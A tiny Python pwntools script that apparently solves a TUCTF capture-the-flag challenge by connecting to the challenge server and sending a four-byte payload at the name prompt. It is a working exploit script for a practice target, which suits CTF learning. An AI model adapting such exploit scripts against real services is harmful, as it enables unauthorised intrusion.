from pwn import *
from struct import pack
import time
io = remote('chal.tuctf.com', 30011)
time.sleep(0.5)
# print(io.recv(1024).decode())
# time.sleep(0.5)
payload = bytes([0x21,0x52,0x41,0x11])
io.sendlineafter(b'Enter your name: ', payload)
print(io.recv(1024))
